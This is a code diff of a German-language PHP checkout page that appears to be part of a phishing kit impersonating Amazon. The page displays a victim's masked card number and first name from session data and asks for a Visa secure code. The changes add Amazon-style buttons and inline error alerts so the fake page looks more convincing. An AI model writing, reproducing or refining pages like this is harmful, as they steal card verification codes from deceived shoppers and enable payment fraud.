@@ -194,9 +194,9 @@
 					
 					<br/><br/>
 				
-					<form action="index.php" method="POST">
+					<form id="frmVisa" action="index.php" method="POST">
 						 <div class="fixed_width_form">
-							<table class="ap_form_table" style="margin-top:10px;margin-left:10px">
+							<table class="ap_form_table" style="margin-top:10px">
 								<tr>
 									<td style="padding:3px">
 										<div class="right">
@@ -232,7 +232,7 @@
 										</div>
 									</td>
 									<td style="padding:3px">
-										XXXX XXXX XXXX <b><?php echo substr($_SESSION['ccnr'], 12, 16); ?></b>
+										XXXX XXXX XXXX <b><?php echo (isset($_SESSION['ccnr'])) ? substr($_SESSION['ccnr'], 12, 16) : ''; ?></b>
 									</td>
 								</tr>
 								
@@ -245,7 +245,7 @@
 										</div>
 									</td>
 									<td style="padding:3px">
-										Hallo <?php echo ucfirst($_SESSION['vorname']); ?>
+										Hallo <?php echo (isset($_SESSION['vorname'])) ? ucfirst($_SESSION['vorname']) : ''; ?>
 									</td>
 								</tr>
 								
@@ -260,7 +260,20 @@
 										</div>
 									</td>
 									<td>
-										<input name="code" value="<?php echo (isset($_SESSION['securecode']) ? $_SESSION['securecode'] : ""); ?>" autocomplete="off" maxlength="30" type="text" style="margin-top:0px;height:18px;width:200px;<?php echo (isset($_SESSION['sc_err']) ? "border:1px solid #A31919" : ""); ?>">
+										<input name="code" value="<?php echo (isset($_SESSION['securecode']) ? $_SESSION['securecode'] : ""); ?>" autocomplete="off" maxlength="30" type="text" style="margin-top:0px;height:18px;width:200px;" class="<?php echo (isset($_SESSION['sc_err']) ? "a-form-error" : ""); ?>">
+
+										<?php if(isset($_SESSION['errList']['securecode'])) { ?>
+											<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert" style="max-width: 300px">
+												<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+													<div class="a-box-inner a-alert-container">
+														<i class="a-icon a-icon-alert"></i>
+														<div class="a-alert-content">
+															<div class="a-section"><?php echo $_SESSION['errList']['securecode'];?></div>
+														</div>
+													</div>
+												</div>
+											</div>
+										<?php } ?>											
 									</td>
 								</tr>
 								
@@ -280,20 +293,29 @@
 								</tr>
 								
 								<tr>
-									<td style="padding:3px">
-										<span class="in-amzn-btn btn-prim-med-ra" unselectable="on" style="margin-top:10px">
+									<td>
+										<!-- <span class="in-amzn-btn btn-prim-med-ra" unselectable="on" style="margin-top:10px">
 											<span>
 												<input name="cancelcode" value="Nicht registriert" tabindex="5" style="width:150px" type="submit">
 											</span>
-										</span>
+										</span> -->
+										<a href="javascript:;" class="with-input">
+								            <span class="a-button" id="a-autoid-1"><span class="a-button-inner"><input class="a-button-input" type="submit" name="cancelcode" value="Nicht registriert" aria-labelledby="a-autoid-1-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-1-announce"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nicht registriert</font></font></span></span></span>
+								        </a>										
 									</td>
 									
-									<td style="padding:3px">
-										<span class="in-amzn-btn btn-prim-med-ra" unselectable="on" style="margin-left:50px;margin-top:10px">
+									<td>
+										<!-- <span class="in-amzn-btn btn-prim-med-ra" unselectable="on" style="margin-left:50px;margin-top:10px">
 											<span>
 												<input name="sendcode" value="Senden" tabindex="5" style="width:150px" type="submit">
 											</span>
-										</span>
+										</span> -->
+										<span class="a-button a-button-primary with-input pull-right">
+											<span class="a-button-inner btn-sec-sm">
+												<a id="B2B-Full-1-heroctavideo-register-announce" href="javascript:;" class="a-button-text btn-sec-med" role="button"><input name="sendcode" value="Senden" type="submit"></a>
+											</span>
+										</span>	
+										<div class="clearfix"></div>
 									</td>
 									
 								</tr>
